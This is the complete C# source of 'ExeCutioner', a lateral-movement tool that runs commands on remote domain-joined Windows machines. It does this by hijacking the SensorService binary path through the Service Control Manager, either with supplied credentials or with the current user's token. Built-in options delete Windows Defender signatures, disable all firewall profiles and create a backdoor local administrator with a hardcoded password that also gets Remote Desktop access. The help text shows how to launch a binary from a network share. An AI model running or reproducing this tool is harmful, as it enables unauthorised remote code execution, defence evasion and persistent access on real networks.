
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Security.Permissions; 
using System.Configuration;
using Microsoft.Win32.SafeHandles;
using System.Runtime.ConstrainedExecution;
using System.Security;



namespace ExeCutioner
{
    public class Program
    {

        [StructLayout(LayoutKind.Sequential)]
        public class QUERY_SERVICE_CONFIG
        {
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwServiceType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwStartType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwErrorControl;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpBinaryPathName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpLoadOrderGroup;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwTagID;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDependencies;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpServiceStartName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDisplayName;
        };


        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);


        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);


        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);


        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);


        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

     
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword,
        int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);



        // Closes Open handles returned by LogonUser
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public extern static bool CloseHandle(IntPtr handle);

        // Impersonates the user we have currently logged on as/creds provided in code below
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        // Required for incorporating this code into a DLL FullTrust.
        [PermissionSetAttribute(SecurityAction.Demand, Name = "FullTrust")]



        // Method to orchestrate impersonation with supplied user details e.g. username, password
        public static void ImpersonateLogon(String target, String MessWithAV, String payload, String NoFw, String AddAdmin, String domainName, String userName, String password)
        {


            SafeTokenHandle safeTokenHandle;
            try
            {
                //Test out impersonation
                IntPtr userHandle = IntPtr.Zero;
                const int LOGON32_PROVIDER_DEFAULT = 0;
                const int LOGON32_LOGON_INTERACTIVE = 2;


                // Grabs access token of specified user  when supplied the username, domain and password
                //Leverages the LogonUser method to do so

                bool returnValue = LogonUser(userName, domainName, password,
                    LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
                    out safeTokenHandle);

                Console.WriteLine("[+] LogonUser called:");

                if (false == returnValue)
                {
                    int ret = Marshal.GetLastWin32Error();
                    Console.WriteLine("[+] LogonUser failed with error code : {0}", ret);
                    throw new System.ComponentModel.Win32Exception(ret);
                }
                using (safeTokenHandle)
                {
                    Console.WriteLine("[+] LogonUser Worked: " + (returnValue ? "Yes" : "No"));
                    Console.WriteLine("[+] NT token: " + safeTokenHandle);

                    // Check the identity.
                    Console.WriteLine("[+] Before impersonation: "
                        + WindowsIdentity.GetCurrent().Name);
                    // Use the token handle returned by LogonUser.
                    using (WindowsIdentity newId = new WindowsIdentity(safeTokenHandle.DangerousGetHandle()))
                    {
                        using (WindowsImpersonationContext impersonatedUser = newId.Impersonate())
                        {

                            // Check the identity.
                            Console.WriteLine("[+] After impersonation: "
                                + WindowsIdentity.GetCurrent().Name);


                            //Remotely Authenticates to target, and requests full access (0xF003F) to the SCManager. Success returns a Handle for the Service Manager
                            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

                            //Requesting full access (0xF01FF) to SensorService. This is a safe non-crucial service for the OS and doesn't start at boot time.
                            string ServiceName = "SensorService";
                            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
                            Console.WriteLine($"[+] Accessing :{ServiceName}");

                            // Get current binPath 
                            UInt32 dwBytesNeeded;
                            QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
                            bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
                            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
                            bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
                            Marshal.PtrToStructure(ptr, qsc);
                            String binPathOrig = qsc.lpBinaryPathName;
                            Console.WriteLine($"[+] Current path of Service binary'{binPathOrig}");

                            //Place-Holder for whether to remove AV definitions or not
                            if (MessWithAV == "true")
                            {
                                //Altering target service, SensorService, so it runs our own binary - MpCmdRun.exe
                                //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                                String defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
                                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, defBypass, null, null, null, null, null, null);
                                Console.WriteLine($"[+] New Service binary '{defBypass}', result: {bResult}.");

                                //Starting SensorService: This is going to run our new binary to wipe All Windows Defender signatures
                                bResult = StartService(schService, 0, null);
                                Console.WriteLine($"[+] Launched service, Wiping Defender Signatures.");
                            }


                            if (NoFw == "true")
                            {
                                //Altering target service, SensorService, so it runs our command
                                //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                                String execCommand = "netsh advfirewall set allprofiles state off";
                                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                                Console.WriteLine($"[+] Turning off firewall : '{execCommand}', result: {bResult}.");

                                //Starting SensorService: This is going to execute the specified command
                                bResult = StartService(schService, 0, null);
                                Console.WriteLine($"[+] Launched service, Executing command");
                            }


                            if (AddAdmin == "true")
                            {
                                //Altering target service, SensorService, so it runs our own binary
                                //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                                String execCommand = "net user newguy MakeLife123 /add";
                                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                                Console.WriteLine($"[+] Adding an admin user: newguy password: MakeLife123");
                                bResult = StartService(schService, 0, null);

                                execCommand = "net localgroup administrators newguy /add";
                                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                                bResult = StartService(schService, 0, null);
                                Console.WriteLine($"[+] Added admin user: '{execCommand}', result: {bResult}.");

                                execCommand = "net localgroup \"Remote Desktop users\" newguy /add";
                                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                                bResult = StartService(schService, 0, null);
                                Console.WriteLine($"[+] Bonus add: '{execCommand}', result: {bResult}.");
                            }

                            //Altering target service, SensorService, so it runs our own binary; whatever is supplied in payload
                            //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                            Console.WriteLine($"[+] Starting the specified binary...Running Command:{payload}");
                            bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
                            bResult = StartService(schService, 0, null);


                            //Restore original binPath
                            bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, binPathOrig, null, null, null, null, null, null);
                            Console.WriteLine($"[+] Restored service binary to '{binPathOrig}', result: {bResult}.");




                        }
                    }
                    // Releasing the context object stops the impersonation
                    // Check the identity.
                    Console.WriteLine("[+] Done: Returning to orginal user context: " + WindowsIdentity.GetCurrent().Name);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] Exception occurred. " + ex.Message);
            }
        }

        //This function uses logged-on users token as and hence does not require direct creds (username, password)
        public static void Logon(String target, String MessWithAV, String payload, String NoFw, String AddAdmin, String domainName, String userName, String password)
        {

            // WindowsImpersonationContext impersonationContext = null;
            // Check the identity.
            Console.WriteLine("[+] Logged on as: "
                + WindowsIdentity.GetCurrent().Name);

            //Remotely Authenticates to target, and requests full access (0xF003F) to the SCManager. Success returns a Handle for the Service Manager
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            //Requesting full access (0xF01FF) to SensorService. This is a safe non-crucial service for the OS and doesn't start at boot time.
            string ServiceName = "SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
            Console.WriteLine($"[+] Accessing :{ServiceName}");

            // Get current binPath 
            UInt32 dwBytesNeeded;
            QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
            bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            Marshal.PtrToStructure(ptr, qsc);
            String binPathOrig = qsc.lpBinaryPathName;
            Console.WriteLine($"[+] Current path of Service binary'{binPathOrig}");

            // This removes AV definitions or not
            if (MessWithAV == "true")
            {
                //Altering target service, SensorService, so it runs our own binary - MpCmdRun.exe
                //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                String defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, defBypass, null, null, null, null, null, null);
                Console.WriteLine($"[+] New Service binary '{defBypass}', result: {bResult}.");

                //Starting SensorService: This is going to run our new binary to wipe All Windows Defender signatures
                StartService(schService, 0, null);
                Console.WriteLine($"[+] Launched service, Wiping Defender Signatures.");
            }


            if (NoFw == "true")
            {
                //Altering target service, SensorService, so it runs our command
                //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                String execCommand = "netsh advfirewall set allprofiles state off";
                bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                Console.WriteLine($"[+] Turning off firewall : '{execCommand}', result: {bResult}.");

                //Starting SensorService: This is going to execute the specified command
                StartService(schService, 0, null);
                Console.WriteLine($"[+] Launched service, Executing command");
            }


            if (AddAdmin == "true")
            {
                //Altering target service, SensorService, so it runs our own binary
                //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
                String execCommand = "net user newguy MakeLife123 /add";
                ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                Console.WriteLine($"[+] Adding an admin user: newguy password: MakeLife123");
                StartService(schService, 0, null);

                execCommand = "net localgroup administrators newguy /add";
                ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                StartService(schService, 0, null);
                Console.WriteLine($"[+] Added admin user: '{execCommand}'");

                execCommand = "net localgroup \"Remote Desktop users\" newguy /add";
                ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, execCommand, null, null, null, null, null, null);
                bResult = StartService(schService, 0, null);
                Console.WriteLine($"[+] Bonus add: '{execCommand}'");
            }

            //Altering target service, SensorService, so it runs our own binary; whatever is supplied in payload
            //SERVICE_NO_CHANGE (0xffffffff), SERVICE_DEMAND_START (0x3), SERVICE_NO_CHANGE (0)
            Console.WriteLine($"[+] Starting the specified binary...Running Command:{payload}");
            ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            StartService(schService, 0, null);


            //Restore original binPath
            bResult = ChangeServiceConfigA(schService, 0xffffffff, 0x3, 0, binPathOrig, null, null, null, null, null, null);
            Console.WriteLine($"[+] Restored service binary to '{binPathOrig}', result: {bResult}.");
        }

        public static void HelpMenu()
        {


            string asciiart = @"
▄███▄      ▄  ▄███▄   ▄█▄      ▄     ▄▄▄▄▀ ▄█ ████▄    ▄   ▄███▄   █▄▄▄▄ 
█▀   ▀ ▀▄   █ █▀   ▀  █▀ ▀▄     █ ▀▀▀ █    ██ █   █     █  █▀   ▀  █  ▄▀ 
██▄▄     █ ▀  ██▄▄    █   ▀  █   █    █    ██ █   █ ██   █ ██▄▄    █▀▀▌  
█▄   ▄▀ ▄ █   █▄   ▄▀ █▄  ▄▀ █   █   █     ▐█ ▀████ █ █  █ █▄   ▄▀ █  █  
▀███▀  █   ▀▄ ▀███▀   ▀███▀  █▄ ▄█  ▀       ▐       █  █ █ ▀███▀     █   
        ▀                     ▀▀▀                   █   ██          ▀    
                                                                         
Executes code on Remote Domain Joined machines              
   v1.0 by anans3                                                                                                             
";
            Console.WriteLine(asciiart);

            Console.WriteLine("[**] Help Menu!\n");

            Console.WriteLine("/addadmin - adds a local administrator called newguy with password MakeLife123 to target");
            Console.WriteLine("/cmd - allows for the execution of commands on the target");
            Console.WriteLine("/domain - allows for the specification of target domain");
            Console.WriteLine("/noav - deletes Windows Defender's signatures");
            Console.WriteLine("/nofw - disables all target firewall profiles");
            Console.WriteLine("/pass - specifies password to use");
            Console.WriteLine("/t - specifies the target");
            Console.WriteLine("/syscreds - ignores the user specified and uses the token of the currently logged in user\n");
            Console.WriteLine("user - specifies the target user account");


            Console.WriteLine("Usage:");
            Console.WriteLine("ExeCutioner.exe /t <target> /user <username>  /pass <password>  /domain <domain> <command-to-run>\n");

            Console.WriteLine("Usage: Examples:");
            Console.WriteLine("ExeCutioner.exe /?  - show's this help menu \n");

            Console.WriteLine("//Authenticate to target with username and password and disable firewall profiles");
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /domain <domain> /nofw true\n");

            Console.WriteLine("//Authenticate to target with current system token and turn off av");
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /syscreds true /nofw true\n");

            Console.WriteLine("//Authenticate to target with current system token and execute command");
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /cmd <command-to-run-in-qoutes>\n");

            Console.WriteLine("//Authenticate to target with current system token and execute binary for lateral movement");
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe>\n");

            return;
        }



        public static void Main(string[] args)
        {

            if (args.Length < 2)
            {
                HelpMenu();
                return;
            }

            String target = null;
            String MessWithAV = null;
            String payload = null;
            String NoFw = null;
            String AddAdmin = null;

            String domainName = "null";
            String userName = "null";
            String password = "null";
            String SysCreds = "false";
            String showHelp = "null";


            for (int i = 0; i < args.Length; i++)
            {
                string parameterName;
                int colonIndex = args[i].IndexOf(':');
                if (colonIndex >= 0)
                    parameterName = args[i].Substring(0, colonIndex);
                else
                    parameterName = args[i];
                switch (parameterName.ToLower())
                {
                    case "/t":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            target = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                target = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a target to be specified with the </t> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/user":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            userName = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                userName = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a user to be specified with the </user> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/pass":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            password = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                password = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a password to be specified with the </pass> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/syscreds":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            SysCreds = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                SysCreds = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected </syscreds true> option to use the current user's access token.");
                                return;
                            }
                        }
                        break;

                    case "/domain":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            domainName = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                domainName = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a domain to be specified with the </domain> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/noav":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            MessWithAV = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                MessWithAV = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected an option to turn off Defender using the </noav true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/cmd":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            payload = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                payload = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a command to be specified with the </cmd> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/nofw":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            NoFw = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                NoFw = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected the option to disable all firewall profiles to be specified with the </nofw true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/addadmin":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            AddAdmin = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                AddAdmin = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected the option to add a new local admin by specifying the </addadmin true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "-?":
                    case "/?":
                    case "-help":
                    case "/help":
                        showHelp = "true";

                        break;
                    default:
                        System.Console.WriteLine("Unrecognized parameter \"{0}\".", parameterName);
                        return;
                }
            }

            //Help Menu
            if (showHelp == "true")
            {
                HelpMenu();
                return;
            }

            //Executes with currently logged on user's access token
            if (SysCreds == "true")
            {
                Logon(target, MessWithAV, payload, NoFw, AddAdmin, domainName, userName, password);
                return;
            }

            //Executes with user supplied credentails <username> and <password>
            ImpersonateLogon(target, MessWithAV, payload, NoFw, AddAdmin, domainName, userName, password);

        }
    }

    //Class to safely handle user access token
    public sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeTokenHandle()
            : base(true)
        {
        }

        [DllImport("kernel32.dll")]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr handle);

        protected override bool ReleaseHandle()
        {
            return CloseHandle(handle);
        }
    }

}

